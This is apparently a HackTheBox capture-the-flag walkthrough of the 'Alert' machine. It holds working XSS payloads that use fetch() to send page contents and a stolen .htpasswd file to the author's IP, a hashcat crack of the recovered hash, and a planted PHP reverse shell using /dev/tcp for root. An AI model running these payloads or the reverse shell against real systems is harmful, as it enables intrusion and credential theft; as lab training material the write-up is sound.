---
title: Alert
tags:
  - HackTheBox
  - Easy
  - Linux
  - XSS
  - LFI
  - Brute-Forcing
  - Tunnelling
date: 2025-01-31T00:00:00Z
---
![](Pasted%20image%2020250131095721.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.44 alert.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- alert.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp    open     ssh
| ssh-hostkey: 
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
80/tcp    open     http
| http-title: Alert - Markdown Viewer
|_Requested resource was index.php?page=alert
12227/tcp filtered unknown
```

So I checked its website:

![](Pasted%20image%2020250131095847.png)

I uploaded a sample markdown to see if it actually worked:

![](Pasted%20image%2020250131100132.png)

> It did

I performed some vhost enumeration with [Ffuf 🐳](/notes/tools/Ffuf.md):

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://alert.htb/ -H 'Host: FUZZ.alert.htb' -fc 301

[redacted]
statistics              [Status: 401, Size: 467, Words: 42, Lines: 15, Duration: 46ms]
```

So I added it to my known hosts and visited it:

![](Pasted%20image%2020250131102936.png)

It seems that I need some credentials

## Exploitation

I managed to upload a XSS:

```md
<a href="javascript:alert('XSS')">Click Me</a>
```

![](Pasted%20image%2020250131100538.png)

So I decided to perform a deeper XSS by appending a payload to know what the app does when inspecting the link. I used this payload:

```js
<script>  
fetch("http://alert.htb/")  
  .then(response => response.text())  
  .then(data => {  
    fetch("http://10.10.14.7:8090/?data=" + encodeURIComponent(data));  
  })  
  .catch(error => console.error("Error fetching the messages:", error));  
</script>
```

![](Pasted%20image%2020250131103534.png)

Okey, now that we know that the payload works I'll try a LFI via XSS. I'll try to read `.htpasswd` file:
- Note that I first tried to get the `.htpasswd` file just inside apache2 but didn't work

```shell
<script>  
fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htapasswd")  
  .then(response => response.text())  
  .then(data => {  
    fetch("http://10.10.14.7:8090/?file_content=" + encodeURIComponent(data));  
  });  
</script>
```

Got the link: `http://alert.htb/visualizer.php?link_share=679c9e462a00f7.46741851.md`

So I pasted it into the Contact Us endpoint:

![](Pasted%20image%2020250131105827.png)

![](Pasted%20image%2020250131105848.png)

I got some encrypted creds: `%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A` -> `<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/</pre>` -> `albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/`

Now I'll brute force it with Hashcat
- Check [Crack Password Hashes (Sites) 🤡](/notes/crack_password_hashes.md) and [Hashcat hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

![](Pasted%20image%2020250131110214.png)

```shell
hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt

hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt --show
$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited
```

> I got creds :D `albert:manchesterunited`

Now I logged in `statistics.alert.htb`:

![](Pasted%20image%2020250131110701.png)

As I didn't see anything, I decided to try to ssh login with previous creds

### User flag

> Worked and got user flag :D

![](Pasted%20image%2020250131110935.png)

## Privilege Escalation

I checked open ports:

```shell
netstat -ant

Proto Recv-Q Send-Q Local Address           Foreign Address         State       
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:37622         127.0.0.1:80            TIME_WAIT  
tcp        0    224 10.10.11.44:22          10.10.14.7:49364        ESTABLISHED
tcp        0      1 10.10.11.44:54046       8.8.8.8:53              SYN_SENT   
tcp        0      0 127.0.0.1:37608         127.0.0.1:80            TIME_WAIT  
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN
```

```shell
curl -S 127.0.0.1:8080
```

![](Pasted%20image%2020250131112040.png)

I'll forward port 8080's traffic to my machine:

```shell
# In my machine I'll run:
ssh -L 1010:127.0.0.1:8080 -N albert@alert.htb
# Then visit http://localhost:1010/
```

![](Pasted%20image%2020250131112254.png)


I'll check the folder of the app:

```shell
ls -la /opt/website-monitor/

drwxrwxr-x 7 root root        4096 Oct 12 01:07 .
drwxr-xr-x 4 root root        4096 Oct 12 00:58 ..
drwxrwxr-x 2 root management  4096 Oct 12 04:17 config
drwxrwxr-x 8 root root        4096 Oct 12 00:58 .git
drwxrwxr-x 2 root root        4096 Oct 12 00:58 incidents
-rwxrwxr-x 1 root root        5323 Oct 12 01:00 index.php
-rwxrwxr-x 1 root root        1068 Oct 12 00:58 LICENSE
-rwxrwxr-x 1 root root        1452 Oct 12 01:00 monitor.php
drwxrwxrwx 2 root root        4096 Oct 12 01:07 monitors
-rwxrwxr-x 1 root root         104 Oct 12 01:07 monitors.json
-rwxrwxr-x 1 root root       40849 Oct 12 00:58 Parsedown.php
-rwxrwxr-x 1 root root        1657 Oct 12 00:58 README.md
-rwxrwxr-x 1 root root        1918 Oct 12 00:58 style.css
drwxrwxr-x 2 root root        4096 Oct 12 00:58 updates
```

I'll create a `shell.php` inside `/config` and give it execution permissions with the following content:

```shell
<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.7/777 0>&1'"); ?>
```

> I get a reverse shell and can read root flag :D
### Root flag

![](Pasted%20image%2020250131113336.png)

==Machine pwned!==